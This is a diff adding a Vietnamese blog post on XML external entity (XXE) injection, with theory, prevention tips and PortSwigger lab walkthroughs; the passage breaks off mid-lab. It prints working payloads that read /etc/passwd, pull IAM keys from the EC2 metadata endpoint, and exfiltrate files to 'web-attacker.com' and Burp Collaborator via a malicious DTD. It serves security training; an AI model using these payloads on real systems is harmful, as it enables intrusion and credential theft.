@@ -1,0 +1,401 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>XML external entity injection - XXE // DatNLQ</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.88.1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="DatNLQ" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://datnlq.github.io/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="XML external entity injection - XXE"/>
+<meta name="twitter:description" content="XML external entity injection (XXE) What is XML enternal entity injection ? XML entermal entity injection hay còn được gọi là XXE injection là 1 lỗ hổng được đánh giá mức độ nghiêm trọng là 4/10 Web Application Secirity Risks của OWASP. XXE là một lỗ hổng bảo mật web cho phép hacker tấn công can thiệp vào quá trình xử lí dữ liệu XML của application.
+Về XXE thì sẽ có 2 phần định nghĩa như sau :"/>
+
+    <meta property="og:title" content="XML external entity injection - XXE" />
+<meta property="og:description" content="XML external entity injection (XXE) What is XML enternal entity injection ? XML entermal entity injection hay còn được gọi là XXE injection là 1 lỗ hổng được đánh giá mức độ nghiêm trọng là 4/10 Web Application Secirity Risks của OWASP. XXE là một lỗ hổng bảo mật web cho phép hacker tấn công can thiệp vào quá trình xử lí dữ liệu XML của application.
+Về XXE thì sẽ có 2 phần định nghĩa như sau :" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://datnlq.github.io/posts/xxe/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-09-28T23:43:19+07:00" />
+<meta property="article:modified_time" content="2021-09-28T23:43:19+07:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://datnlq.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="DatNLQ" /></a>
+      <h1>DatNLQ</h1>
+      <p>DatNLQ&#39;s personal website</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/datnlq" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>My Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">XML external entity injection - XXE</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Sep 28, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          17 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="xml-external-entity-injection-xxe">XML external entity injection (XXE)</h1>
+<h2 id="what-is-xml-enternal-entity-injection-">What is XML enternal entity injection ?</h2>
+<p>XML entermal entity injection hay còn được gọi là XXE injection là 1 lỗ hổng được đánh giá mức độ nghiêm trọng là 4/10 Web Application Secirity Risks của OWASP.
+XXE là một lỗ hổng bảo mật web cho phép hacker tấn công can thiệp vào quá trình xử lí dữ liệu XML của application.</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_lythuyet.png?raw=true" alt="img"></p>
+<p>Về XXE thì sẽ có 2 phần định nghĩa như sau :</p>
+<ul>
+<li>XML : là ngôn ngữ đánh dấu mở rộng được thiết kế với mục đích luuw trữ truyền dữ liệu và cả người và &ldquo;máy&rdquo; đều có thể đọc được.</li>
+</ul>
+<p>Struct XML:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+  &lt;application&gt;
+      &lt;title&gt;eMB&lt;/title&gt;
+      &lt;company&gt;MB&lt;/company&gt;
+      &lt;year&gt;2021&lt;/year&gt;
+      &lt;price&gt;40000000&lt;/price&gt;
+  &lt;/application&gt;
+</code></pre></div><p>Dòng đầu tiên là dùng để khai báo XML ( XML declaration)&lt;Không bắt buộc&gt;
+Phần thân bao gồm nhiều cặp thẻ khác nhau tạo nên các phần tử khác nhau và lồng vào nhau tạo thành cấu trúc dạng cây. Sẽ có quy định về cú pháp, cách khai báo, cách lồng các phần tử, thuộc tính ,&hellip;.</p>
+<ul>
+<li>
+<p>External Entity : entity tham chiếu đến nội dung một file bên ngoài tài liệu XML.</p>
+<p>*Entity : là 1 khái niệm có thể dược sử dụng như một kiểu tham chiếu đến dữ liệu, cho phép thay thế 1 ký tự đặc biệt,
+1 khối văn bản hay thậm chí toàn bộ nội dung 1 file vào trong tài liệu XML. Một số kiểu entity: character, parameter, named (internal), external…</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;!DOCTYPE order SYSTEM &#34;order.dtd&#34;&gt;
+&lt;!DOCTYPE ran SYSTEM &#34;/dev/random&#34;&gt;
+&lt;!DOCTYPE request [
+     &lt;!ENTITY include SYSTEM &#34;c:\secret.txt&#34;&gt;
+]&gt;
+</code></pre></div><p>==&gt; XXE là lỗ hổng lợi dụng tính năng phân tích cú pháp của XML dùng để phân tích cú pháp đầu vào XML từ người dùng.
+Dựa vào đó hacker có thể truy cập các tệp cục bộ, chạy các lệnh, quét các dịch vụ và các cổng nội bộ, truy cập mạng nội bộ, từ đó thưc hiện nhiều phương pháp tấn công tương ứng.</p>
+<h2 id="how-do-xxe-vulnerabilities-arise">How do XXE vulnerabilities arise?</h2>
+<p>Lỗi XXE phát sinh do bên trong XML có chứa các tính năng nguy hiểm và XML cho phép sử dụng các công cụ phân tích các tính năng này.</p>
+<h2 id="what-are-the-types-of-xxe-attacks">What are the types of XXE attacks?</h2>
+<ul>
+<li>
+<p>Exploit XXE to retireve files(Khai thác XXE để truy xuất file) :  External entity được xác định có chứa nội dung của file và trả về trong phản hồi của ứng dụng.</p>
+</li>
+<li>
+<p>Exploit XXE to perform SSRF attacks(Khai thác XXE để thực hiện các cuộc tấn công SSRF) : External entity được xác định dựa trên URL đến hệ thống back-end.</p>
+</li>
+<li>
+<p>Exploit blind XXE exfiltrate data out-of-band(Khai thác lỗ hổng XXE mù ngoài luồng dữ liệu exfiltrate): Dữ liệu nhạy cảm có thể được truyền từ máy chủ ứng dụng đến máy chủ của hacker.</p>
+</li>
+<li>
+<p>Exploit blind XXE to retire data via error messages(Khai thác lỗ hổng XXE mù để truy xuất dữ liệu thông qua thông báo lỗi): Nơi mà hacker dùng các thông báo lỗi để phân tích dữ liệu nhạy cảm.</p>
+</li>
+</ul>
+<h2 id="xxe-attack-flow">XXE attack flow</h2>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_flow.png?raw=true" alt="img"></p>
+<p>Hacker có thể tận dụng tối đa các thực thể bên ngoài XML để sử dụng lổ hổng này nhằm sử dụng chức năng bên ngoài của nó.
+Trong nhiều trường hợp thì lỗ hổng XXE cũng có thể là 1 ví dụ về cách hacker có thể tận dụng cấu hình sai này của trình phân tích cú pháo XML về cơ bản biến nó thành 1 máy chủ proxy để chúng có thể thực hiện các cuộc tấn công Select query về phía máy chủ
+và truy cập vào mạng nội bộ hoặc có thể kết nối với các máy chủ công cộng bên ngoài từ sau tường lửa. Hacker có thể sử dụng định nghĩa thực thể XML và định danh hệ thống trên trình phân tích cú pháp XML để chỉ chấp nhận các yêu cầu được tạo ra thủ công độc hại chứa các tệp XML dường như vô hại đối với tường lửa hoặc ứng dụng vì chức năng của các dịch vụ đó dường như không bị tấn công trực tiếp.</p>
+<h2 id="find-and-test-for-xxe-vulnerabilities">Find and test for XXE vulnerabilities</h2>
+<p>Đa số các lỗ hổng XXE thì chúng ta có thể tìm được thông qua chức năng scanner vulnerabilities của Burp Suite hỗ trợ.</p>
+<p>Ngoài ra có thể kiểm tra thủ công như sau :</p>
+<ul>
+<li>
+<p>Kiểm tra khả năng truy xuất tệp bằng cashc xác định một external entity dựa trên một tệp hệ điều hành nổi tiếng và sử dụng thực thể đó trong dữ liệu được trả về trong phản hồi của ứng dụng</p>
+</li>
+<li>
+<p>Kiểm tra các lỗ hổng blind XXE bằng cashc xác định 1 external entity bên dựa trên URL của 1 hệ thống mà bạn kiểm soát và giám sát. Chức năng Burp Collaborator của Burp Suite có thể hỗ trợ chúng ta phần này.</p>
+</li>
+<li>
+<p>Kiểm tra xem máy có dễ bị injection vào dữ liệu không phải là XML do người dùng cung cấp trong tài liệu XML phía máy chủ hay không, bằng cashc sử dụng XInclude attack để cố gắng truy xuất hệ điều hành nổi tiếng.</p>
+</li>
+</ul>
+<p><em>XInclude</em> là một phần của đặc tả XML cho phép một tài liệu XML được xây dựng từ các tài liệu con. Bạn có thể đặt một cuộc tấn công XInclude trong bất kỳ giá trị dữ liệu nào trong tài liệu XML, do đó, cuộc tấn công có thể được thực hiện trong các tình huống mà bạn chỉ kiểm soát một mục dữ liệu duy nhất được đặt vào tài liệu XML phía máy chủ.</p>
+<p>Để thực hiện một cuộc tấn công XInclude, bạn cần tham chiếu không gian tên XInclude và cung cấp đường dẫn đến tệp mà bạn muốn đưa vào. Ví dụ:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;foo xmlns: xi = &#34;http://www.w3.org/2001/XInclude&#34;&gt;
+&lt;xi: include parse = &#34;text&#34; href = &#34;file: /// etc / passwd&#34; /&gt; &lt;/foo&gt;
+
+</code></pre></div><h3 id="prevent-xxe-vulnerabilities">Prevent XXE vulnerabilities</h3>
+<p>Các lỗ hổng XXE đều phát sinh do thư viện phân tích cú pháp XML của ứng dụng hỗ trợ các tính năng XML tiềm ẩn nguy hiểm ma fungws dụng không cần hoặc có ý định sử dụng. CÁch dễ nhất và hiệu quả nhất là vô hiệu hóa những chức năng tiềm ẩn nguy hiểm đó.</p>
+<ul>
+<li>
+<p>Bất cứ khi nào có thể, hãy sử dụng các định dạng dữ liệu ít phức tạp hơn như JSON và tránh tuần tự hóa dữ liệu nhạy cảm.</p>
+</li>
+<li>
+<p>Vá hoặc nâng cấp tất cả các bộ xử lý và thư viện XML được ứng dụng hoặc trên hệ điều hành cơ bản sử dụng. Sử dụng bộ kiểm tra phụ thuộc. Cập nhật SOAP lên SOAP 1.2 hoặc cao hơn.</p>
+</li>
+<li>
+<p>Triển khai xác thực, lọc hoặc khử trùng đầu vào tích cực phía máy chủ để ngăn chặn dữ liệu thù địch trong các tài liệu, tiêu đề hoặc nút XML.</p>
+</li>
+<li>
+<p>Xác minh rằng chức năng tải lên tệp XML hoặc XSL kiểm tra XML đến bằng cách sử dụng xác thực XSD hoặc tương tự.</p>
+</li>
+<li>
+<p>Các công cụ Kiểm tra Bảo mật Ứng dụng Tĩnh có thể phát hiện XXE trong mã nguồn, nhưng xem xét mã thủ công là giải pháp thay thế tốt nhất trong các ứng dụng phức tạp với nhiều tích hợp.</p>
+</li>
+</ul>
+<h2 id="xxe-lab">XXE Lab</h2>
+<h3 id="lab-exploiting-xxe-using-external-entities-to-retrieve-files">Lab: Exploiting XXE using external entities to retrieve files</h3>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">This lab has a &#34;Check stock&#34; feature that parses XML input and returns any unexpected values in the response.
+
+To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file.
+</code></pre></div><p>Mô tả trên đã chỉ ra cho chúng ta biết lỗi chúng ta có thể khai thác nằm ở chức năng &ldquo;Check stock&rdquo; của web, và yêu cầu chúng ta leak được file passwd thì sẽ hoàn thành.</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_retrievefile_web.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_retrievefile_checkstock.png?raw=true" alt="img"></p>
+<p>Sau khi check stock và bắt lạ request chúng ta có thể thấy 1 XML cơ bản và cách exploit vô cùng đơn giản.</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_retrievefile_checkstock_request.png?raw=true" alt="img"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt; ]&gt;
+&lt;stockCheck&gt;
+&lt;productId&gt;&amp;xxe;&lt;/productId&gt;
+&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;
+</code></pre></div><p>Thay vì kiểm tra productID như bt thì payload này sẽ tham chiếu đến thực thể bên ngoài(external entity) và truy xấu giá trị của xxe là file:///etc/passwd</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_retrievefile_catpasswd.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_retrievefile_web_solve.png?raw=true" alt="img"></p>
+<h3 id="lab-exploiting-xxe-to-perform-ssrf-attacks">Lab: Exploiting XXE to perform SSRF attacks</h3>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">This lab has a &#34;Check stock&#34; feature that parses XML input and returns any unexpected values in the response.
+
+The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
+
+To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server&#39;s IAM secret access key from the EC2 metadata endpoint.
+</code></pre></div><p>Như bài lab đã mô tả cho chúng ta biết được rằng mạng nội bộ mà chúng ta cần là http://169.254.169.254/ và request chúng ta bắt được khi check stock vẫn là form XXE như cũ điều đó dẫn chúng ta đến payload như sau :</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;http://169.254.169.254/&#34;&gt; ]&gt;
+</code></pre></div><p>Tiếp theo chúng ta chuyển sang repeater để thử &gt;</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_perform_requets.png?raw=true" alt="img"></p>
+<p>&ldquo;Invalid product ID:&rdquo; Là phản hồi được trả về, kèm theo sau đó là 1 foldername, sau đó thêm folder name vào phía sau của URL mà chúng ta có được, cứ tiếp tục như thế cho đến khi chúng ta có được SecretAccessKey.</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_perform_requets_payload1.png?raw=true" alt="img">
+<img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_perform_requets_payload2.png?raw=true" alt="img">
+<img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_perform_requets_payload3.png?raw=true" alt="img"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">latest/meta-data/iam/security-credentials/admin
+</code></pre></div><p>Sau đó chúng ta có được payload cuối cùng như sau</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&#34;&gt; ]&gt;
+&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;
+</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_perform_requets_json.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_perform_solve.png?raw=true" alt="img"></p>
+<h3 id="lab-exploiting-xinclude-to-retrieve-files">Lab: Exploiting XInclude to retrieve files</h3>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">This lab has a &#34;Check stock&#34; feature that embeds the user input inside a server-side XML document that is subsequently parsed.
+
+Because you don&#39;t control the entire XML document you can&#39;t define a DTD to launch a classic XXE attack.
+
+To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file.
+</code></pre></div><p>Chúng ta sử dụng XInclude để khai thác file /etc/passwd. Trước hết chúng ta cần biết về XInclude : Để thực hiện một cuộc tấn công XInclude,
+bạn cần tham chiếu không gian tên XInclude và cung cấp đường dẫn đến tệp mà bạn muốn đưa vào. Ví dụ:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;foo xmlns: xi = &#34;http://www.w3.org/2001/XInclude&#34;&gt;
+
+&lt;xi: include parse = &#34;text&#34; href = &#34;file: /// etc / passwd&#34; /&gt; &lt;/foo&gt;
+
+</code></pre></div><p>Chúng ta truy cập bài lab và bắt request của check stock như sau</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_Xinclude_retirefile_request.png?raw=true" alt="img"></p>
+<p>Nhận thấy rằng đã có sự thay đổi trong cách thử sử dụng XML, lab đã không sử dụng cấu trúc như cũ mà đã chọn cách nhúng dữ liệu vào DOCTYPE,
+điều này khiến chúng ta không thể thực hiện 1 cuộc tấn công cổ điển vì không thể xác định được rõ ràng cấu trúc của XML.</p>
+<p>Chúng ta có thể sử
+dụng XInclude để khai thác file /etc/passwd. Trước hết chúng ta cần biết về XInclude : XInclude là một phần của đặc tả XML cho phép một tài
+liệu XML được xây dựng từ các tài liệu con. Bạn có thể đặt một cuộc tấn công XInclude trong bất kỳ giá trị dữ liệu nào trong tài liệu XML, do
+đó, cuộc tấn công có thể được thực hiện trong các tình huống mà bạn chỉ kiểm soát một mục dữ liệu duy nhất được đặt vào tài liệu XML phía máy
+chủ. Để thực hiện một cuộc tấn công XInclude, bạn cần tham chiếu không gian tên XInclude và cung cấp đường dẫn đến tệp mà bạn muốn đưa vào.
+Ví dụ:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;foo xmlns: xi = &#34;http://www.w3.org/2001/XInclude&#34;&gt;
+
+&lt;xi: include parse = &#34;text&#34; href = &#34;file: /// etc / passwd&#34; /&gt; &lt;/foo&gt;
+
+</code></pre></div><p>Sau đó chúng ta truyền payload này vào 1 param của request cụ thể hơn lần này là ProductID.</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_Xinclude_retirefile_passwd.png?raw=true" alt="img"></p>
+<p>Và chúng ta đã leak được file passwd.</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_Xinclude_retirefile_solve.png?raw=true" alt="img"></p>
+<h3 id="lab-exploiting-xxe-via-image-file-upload">Lab: Exploiting XXE via image file upload</h3>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.
+
+To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the &#34;Submit solution&#34; button to submit the value of the server hostname.
+</code></pre></div><p>Bài lab này mô tả khá chi tiết như sau, lồ hổng mà chúng ta cần khai thác lần này là phần comment của bài, trong phần đó cho đính kèm ảnh và bài yêu cầu chúng ta trả về file
+/etc/hostname và click Submit solution để solve bài lab.</p>
+<p>Hint: ảnh dạng SVG sẽ có format XML :33</p>
+<p>Điều này đã giúp chúng ta hình dung được cách thức tấn công, truy cập bài lab và chúng ta nhận được 1 blog như sau :</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_image_blog.png?raw=true" alt="img"></p>
+<p>Chúng ta thấy phần cmt sẽ có phần thêm avatar , từ đó chúng ta có thể thêm bất kỳ ảnh nào. Như gọi ý thì SVG sẽ có format là XML nên chúng ta tạo 1 XML như sau và lưu dưới định
+dạng svg.</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_image_cmt.png?raw=true" alt="img"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;?xml version=&#34;1.0&#34; standalone=&#34;yes&#34;?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/hostname&#34; &gt; ]&gt;
+&lt;svg width=&#34;128px&#34; height=&#34;128px&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; xmlns:xlink=&#34;http://www.w3.org/1999/xlink&#34; 
+version=&#34;1.1&#34;&gt;&lt;text font-size=&#34;16&#34; x=&#34;0&#34; y=&#34;16&#34;&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;
+</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_image_request.png?raw=true" alt="img"></p>
+<p>Payload này sẽ trả về giá trị của file /etc/hostname mà chúng ta cần.</p>
+<p>Giá trị của ảnh trả về như sau</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">94a8bb1f14c8
+</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_image_submit.png?raw=true" alt="img">
+<img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_image_solve.png?raw=true" alt="img"></p>
+<h3 id="lab-blind-xxe-with-out-of-band-interaction">Lab: Blind XXE with out-of-band interaction</h3>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">This lab has a &#34;Check stock&#34; feature that parses XML input but does not display the result.
+
+You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.
+
+To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
+</code></pre></div><p>Mô tả nói rằng check stock vẫn sẽ là mục tiêu exploit của chúng ta tuy nhiên lần này lại là blind vulnerability và đề xuất chúng ta sử dụng out-of-band (<a href="https://portswigger.net/burp/application-security-testing/oast">OAST</a>) để khai thác.</p>
+<p>Truy cập bài lab chúng ta lại thấy web bán hàng và tìm tới chức năng check stock rồi bắt lại request.</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_outofband_request.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_outofband_repeater.png?raw=true" alt="img"></p>
+<p>Tại đây chúng ta có thể thấy format của XML điều đó có nghĩa chúng ta có thể thực hiện 1 cuộc tấn công XXE cơ bản, tuy nhiên phải áp dụng out-of-band. Và Burp Collaboration sẽ cũng cấp cho chúng ta 1 client để nhận dữ liệu về. Từ đó có payload như sau :</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;!DOCTYPE stockCheck [ &lt;!ENTITY xxe SYSTEM &#34;http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net&#34;&gt; ]&gt;
+</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_outofband_poll.png?raw=true" alt="img"></p>
+<p>Sau khi poll về chúng ta sẽ thấy data đã có thể chuyển về client điều này có nghĩa là chúng ta đã thành công tấn công OAST</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_outofband_solve.png?raw=true" alt="img"></p>
+<h3 id="lab-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities">Lab: Blind XXE with out-of-band interaction via XML parameter entities</h3>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">This lab has a &#34;Check stock&#34; feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.
+
+To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
+</code></pre></div><p>Đầu tiên chúng ta bắt lại request và thực thi thử XXE cơ bản thì nhận thấy rằng không có gì trả về :</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_outofband_param_request.png?raw=true" alt="img"></p>
+<p>Đôi khi các cuộc tấn công external entity XXE thường bị chặn, do 1 số xác thực đầu vào của ứng dụng hoặc
+1 số quá trình làm cứng trình phần tích cú pháp XML đang được sử dụng. Trong trường hợp này chúng ta có
+thể sử dụng tham số XML để thay thế. Đầu tiên khai báo 1 thực thể tham số XML :</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;!ENTITY % myparameterentity &#34;my parameter entity value&#34; &gt;
+</code></pre></div><p>Sau đó tham chiếu thực thể như sau :</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;!DOCTYPE stockCheck [&lt;!ENTITY % xxe SYSTEM &#34;http://5flrcyoaljmclbaal1bjrgfj3a90xp.burpcollaborator.net&#34;&gt; %xxe; ]&gt;
+</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_outofband_param_payload.png?raw=true" alt="img"></p>
+<p>Sau khi send request thì chúng ta poll data về client.</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_outofband_param_poll.png?raw=true" alt="img"></p>
+<p>Và chúng ta đã hoàn thành bài lab</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_outofband_param_solve.png?raw=true" alt="img"></p>
+<h3 id="lab-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd">Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD</h3>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">This lab has a &#34;Check stock&#34; feature that parses XML input but does not display the result.
+
+To solve the lab, exfiltrate the contents of the /etc/hostname file.
+</code></pre></div><p>Bài lab mô tả răng lỗ hổng này sẽ có phân tích input và sẽ không hiển thị kết quả, điều này làm rõ đặc tính của blind vuln.</p>
+<p>Truy cập bài lab chúng ta thấy 1 trang web bán hàng với chức năng check stock như đã biết trước , tuy nhiên để thực hiện được exfiltrate data đối với XXE thì chúng ta cần  maliciuos DTD, cụ thể hơn trong bài này chúng ta sẽ tạo 1 malicious DTD bằng exploit server. Dựa trên các tiêu chí để tạo ra 1 malicious DTD chúng ta tạo được payload như sau :</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/XXE/image/XXE_malicious_request.png?raw=true" alt="img"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;!ENTITY % file SYSTEM &#34;file:///etc/passwd&#34;&gt;
+&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http://web-attacker.com/?x=%file;&#39;&gt;&#34;&gt;
+%eval;
+%exfiltrate;
+
+==&gt; 
+
+&lt;!ENTITY % file SYSTEM &#34;file:///etc/hostname&#34;&gt;
+&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;http://8luiimejfgly1q6a5g8ardcwlnrdf2.burpcollaborator.net/?x=%file;&#39;&gt;&#34;&gt;
+%eval;
+%exfil;
+</code></pre></div><p>Đầu tiên chúng ta thêm đuôi dtd vào tên file để file trở thành đúng định dạng.</p>
